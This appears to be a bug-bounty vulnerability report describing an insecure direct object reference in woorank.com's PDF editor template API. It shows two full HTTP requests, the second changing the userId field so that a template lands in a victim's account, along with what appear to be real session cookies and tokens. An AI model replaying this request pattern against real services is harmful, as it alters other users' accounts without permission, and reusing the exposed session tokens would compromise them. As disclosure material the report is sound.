# (IDOR)Insecure Direct Object Request

Domain : `www.woorank.com`
Endpoint / vulnerable component : `https://www.woorank.com/en/pdf-editor`
Severity : `HIGH`

Proof of Concept / description
====
The First Step is Open

>https://www.woorank.com/en/pdf-editor

and add new template
I will name the template for example "test"

Request
------
````
POST /api/pdf-editor/templates HTTP/1.1
Host: www.woorank.com
User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.woorank.com/en/pdf-editor
content-type: application/json
Content-Length: 528
Cookie: PHPSESSID=8fc5cf451c7a60ca2b4253a374c3ca43; language=en; gamp-cid=1701db68-f15b-49a4-8ba8-b87a74d2b727; chatliouuid--34e85fcc-ffb9-4b5f-6df1-ab1b7d10fc0c=100548a5-0b2c-4e20-9a10-44e297bb5e18; chatliort--34e85fcc-ffb9-4b5f-6df1-ab1b7d10fc0c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjZVVVSUQiOiIzNGU4NWZjYy1mZmI5LTRiNWYtNmRmMS1hYjFiN2QxMGZjMGMiLCJleHAiOjE2MzgwNTg5NDQsImlhdCI6MTU3NDk4Njk0NCwidnNVVUlEIjoiMTAwNTQ4YTUtMGIyYy00ZTIwLTlhMTAtNDRlMjk3YmI1ZTE4In0.LgDr61Wv4P2E74ZOOqh8C6PXD5KAGC552fdBpOgycGQ; chatlioat--34e85fcc-ffb9-4b5f-6df1-ab1b7d10fc0c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjZVVVSUQiOiIzNGU4NWZjYy1mZmI5LTRiNWYtNmRmMS1hYjFiN2QxMGZjMGMiLCJleHAiOjE1NzQ5OTQxNDQsImlhdCI6MTU3NDk4Njk0NCwidnNVVUlEIjoiMTAwNTQ4YTUtMGIyYy00ZTIwLTlhMTAtNDRlMjk3YmI1ZTE4In0.RWgVjnxxcAwVDt-pIQ3CGtPIHLYfCrcrViJSPUAGPaY; smToken=vnNsFAkz2CT8FS9N6WxshaB0
DNT: 1
Connection: close

{"template":{"applyCustomCriteria":false,"keywordTool":{"enabled":true,"displayChart":true,"tableColumns":{"location":true,"volume":true,"competitors":true},"order":"keyword","filter":""},"closingPage":{"enabled":false,"customText":null},"colorScheme":{"primaryColor":["#2B5C86"],"secondaryColors":["#afe5e7","#539597","#29494a"]},"coverPage":null,"customCriteria":{},"displayScore":true,"externalLinks":true,"footer":null,"language":"en","name":"test","theme":"modern","shareWithSubusers":false,"size":"a4","userId":"1175202ATTACKER's userId "}}

````
![11](https://user-images.githubusercontent.com/50469661/136313230-205c1789-b694-4e5e-9057-82758852867d.png)

the Second step
I will create a new account to test the bug
And then get the userId of the new account

I will send the same request for the old account (the attacker's account) and the same cookies but we will change the value of userId to the value of the victim account
>The attacker's userId is: 1175202
The userId of the victim is: 1175206


I will switch the attacker's userId to the victim's userId with the attacker's privileges and cookies
New Request
-----
````
POST /api/pdf-editor/templates HTTP/1.1
Host: www.woorank.com
User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.woorank.com/en/pdf-editor
content-type: application/json
Content-Length: 528
Cookie: PHPSESSID=8fc5cf451c7a60ca2b4253a374c3ca43; language=en; gamp-cid=1701db68-f15b-49a4-8ba8-b87a74d2b727; chatliouuid--34e85fcc-ffb9-4b5f-6df1-ab1b7d10fc0c=100548a5-0b2c-4e20-9a10-44e297bb5e18; chatliort--34e85fcc-ffb9-4b5f-6df1-ab1b7d10fc0c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjZVVVSUQiOiIzNGU4NWZjYy1mZmI5LTRiNWYtNmRmMS1hYjFiN2QxMGZjMGMiLCJleHAiOjE2MzgwNTg5NDQsImlhdCI6MTU3NDk4Njk0NCwidnNVVUlEIjoiMTAwNTQ4YTUtMGIyYy00ZTIwLTlhMTAtNDRlMjk3YmI1ZTE4In0.LgDr61Wv4P2E74ZOOqh8C6PXD5KAGC552fdBpOgycGQ; chatlioat--34e85fcc-ffb9-4b5f-6df1-ab1b7d10fc0c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjZVVVSUQiOiIzNGU4NWZjYy1mZmI5LTRiNWYtNmRmMS1hYjFiN2QxMGZjMGMiLCJleHAiOjE1NzQ5OTQxNDQsImlhdCI6MTU3NDk4Njk0NCwidnNVVUlEIjoiMTAwNTQ4YTUtMGIyYy00ZTIwLTlhMTAtNDRlMjk3YmI1ZTE4In0.RWgVjnxxcAwVDt-pIQ3CGtPIHLYfCrcrViJSPUAGPaY; smToken=vnNsFAkz2CT8FS9N6WxshaB0
DNT: 1
Connection: close

{"template":{"applyCustomCriteria":false,"keywordTool":{"enabled":true,"displayChart":true,"tableColumns":{"location":true,"volume":true,"competitors":true},"order":"keyword","filter":""},"closingPage":{"enabled":false,"customText":null},"colorScheme":{"primaryColor":["#2B5C86"],"secondaryColors":["#afe5e7","#539597","#29494a"]},"coverPage":null,"customCriteria":{},"displayScore":true,"externalLinks":true,"footer":null,"language":"en","name":"hacked+by+caesareg+test 1","theme":"modern","shareWithSubusers":false,"size":"a4","userId":"1175206VICTEM's userId "}}


````

![12](https://user-images.githubusercontent.com/50469661/136313391-04a99d84-a2f1-4592-b746-85308fa6f8ef.png)

DONE !!
The templates have been added to the victim's account without his permission

![13](https://user-images.githubusercontent.com/50469661/136313448-cbf11862-be50-471e-9179-fef617b09800.png)

Impact
----
Add templates to any account without permission from the author
Send new templates to all site users



